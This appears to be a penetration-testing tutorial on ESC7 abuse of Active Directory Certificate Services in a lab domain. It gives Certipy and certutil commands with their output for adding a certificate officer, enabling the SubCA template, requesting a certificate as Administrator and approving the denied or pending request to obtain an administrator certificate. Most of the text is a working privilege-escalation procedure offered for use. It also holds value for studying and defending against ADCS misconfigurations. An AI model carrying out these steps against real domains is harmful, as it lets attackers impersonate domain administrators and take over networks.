This attack vector is very similar to the ESC4 attack where we are leveraging a permissive *DACL(Access Control List)* allowing the user to edit configuration; but this time the main target is the *CA(Certification Authority)* settings.
Specifically everything turns around 2 users rights the `ManageCA` right and the `ManageCertificates` right, often equated to the roles of `CA administrator` and `Certificate Manager` (also known as a CA officer), respectively.
This signifies the potential to modify the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag referenced in the previous `ESC6` section.


## Requisites
As named before in order to accomplish this attack our user is required holding the  `ManageCA` and `ManageCertificates` user rights.
- If we gain control over a principal with the `ManageCA` right over the `CA`, we can remotely manipulate the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to enable SAN (Subject Alternative Name) specification in any template (refer to ESC6).
- If we gain control over a principal with the `ManageCertificates` right over the `CA`, we remotely approve pending certificate requests, bypassing the protection of `CA certificate manager approval`.


## Enumeration
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)
<SNIP>
Certificate Authorities                        
  0                                            
    CA Name                             : lab-LAB-DC-CA                                        
    DNS Name                            : LAB-DC.lab.local                                     
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local                   
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101                     
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00                            
    Certificate Validity End            : 2027-03-26 00:17:46+00:00                            
    Web Enrollment                      : Enabled                                              
    User Specified SAN                  : Enabled                                              
    Request Disposition                 : Issue                                                
    Enforce Encryption for Requests     : Disabled                                             
    Permissions                                
      Owner                             : LAB.LOCAL\Administrators                             
      Access Rights                            
        Enroll                          : LAB.LOCAL\Authenticated Users                        
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA                              
        ManageCa                        : LAB.LOCAL\Black Wasp                                 
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA                                                          
                                          LAB.LOCAL\Domain Admins                              
                                          LAB.LOCAL\Enterprise Admins                          
                                          LAB.LOCAL\Administrators                             
    [!] Vulnerabilities                        
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
      <SNIP>
```
What we are looking for here is the **ManageCa** user rights over our user.

**Windows:**
```
cd C:\Tools\PSPKI\PSPKI; 
Import-Module .\PSPKI.psd1


Rights            : ManageCA, Enroll
AccessControlType : Allow
IdentityReference : LAB\blwasp
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```
We can enumerate the CA settings as well.
```
certutil.exe -config "LAB-DC.lab.local\lab-LAB-DC-CA" -getreg "policy\EditFlags"
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\lab-LAB-DC-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
CertUtil: -getreg command completed successfully.
```
In the above output, we notice the value of `EditFlags`, which is `1376590`. That value means that the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set allowing us to perform the **ESC6 attack**.


# Attack Scenario 1 (ManageCA)
We have several ways to abuse the privileges of `ManageCA`. One of them would be to enable `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the `ESC6` attack, but this will not have any effect until the CA service (CertSvc) is restarted.
Another technique for exploiting the `ManageCA` right is to validate failed certificate requests. The `ManageCertificates` role allows us to approve pending certificate requests. By combining the `ManageCA` and `ManageCertificates` roles, we can issue certificate requests that have failed (e.g., due to the user not being allowed to enroll with that template).
The built-in `SubCA` template is also enabled (as it is by default). This template is vulnerable to `ESC1` but only permits `Domain Admins` and `Enterprise Admins` to enroll.

- We start by checking if the **SubCA** template exist.
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -stdout 

<SNIP>
  22                                                                     
    Template Name                       : SubCA                      
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : lab-LAB-DC-CA              
    Enabled                             : True                   
    Client Authentication               : True                       
    Enrollment Agent                    : True             
    Any Purpose                         : True                                                                                                    
    Enrollee Supplies Subject           : True                 
    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                 
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
```
The issue here is that by default this template can be enrolled only by *Domain/Enterprise Admins.*
- EXTRA: if the **SubCa** template is Disabled can be activated by sending the following command from the user that holds the *ManageCA rights*.
```
certipy-ad ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -enable-template 'SubCA'
```
- We need to check that our user have `ManageCertificates` rights by checking the ADCS server config.
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)                            

<SNIP>
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA
        ManageCa                        : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
```
- If the output from previous command does not display the `ManageCertificates` rights, it indicates that the server's rights are set by default(AKA only Domain Admins, Enterprise Admins, and Administrators have the rights to approve certificate). However, since we have **ManageCA** rights, we can assign **ManageCertificate** rights to any account.
```
certipy-ad ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -add-officer BlWasp
```
- Check back now that both rights are in place.
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -stdout        

<SNIP>
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA
        ManageCertificates              : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
        ManageCa                        : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA
```
- Issue now a new certificate, it will **fail** which is normal because our user is not part of the *Domain/Enterprise Admins*. We need to save the request ID `31`, and respond yes to the question: `Would you like to save the private key? (y/N)`. We will need this private key to retrieve the certificate later.
```
 certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template SubCA -upn Administrator@lab.local

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 31
Would you like to save the private key? (y/N) y
[*] Saved private key to 31.key
[-] Failed to request certificate
```
- Now we can leverage our AD user rights(*ManageCertificates*) to re-issue the failed certificate.
```
certipy-ad ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 31
```
-  And now retrive the issued certificate by pointing to the right ID.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 31
```
Enjoy the *pfx* to take it further in the attack.


# Attack Scenario 2 (ManageCertificates)
This scenario differs from the previous one where the *ManageCertificates* is already assigned to our user. This allows us to manage the approval request of the issued certificates.

- We start by reviewing all the available Templates and we can find that there is a ESC1 template, but **Manager Approval** is required.
```
<SNIP>
  35
    Template Name                       : ESC7_1
    Display Name                        : ESC7_1             
    Requires Manager Approval           : True
```
- To bypass we can issue a request that will get stuck in the Manager approval process.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC7_1 -upn Administrator@lab.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[!] Certificate request is pending approval
[*] Request ID is 59
Would you like to save the private key? (y/N) 
```
- We can leverage our **ManageCertificates** user rights to approve that issue with the ID from the previous step.
```
certipy-ad ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 59
```
- Now we can retrieve the issued certificate with the same ID number.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 59
```
Enjoy the *pfx* to take even further you attacks to the environment.
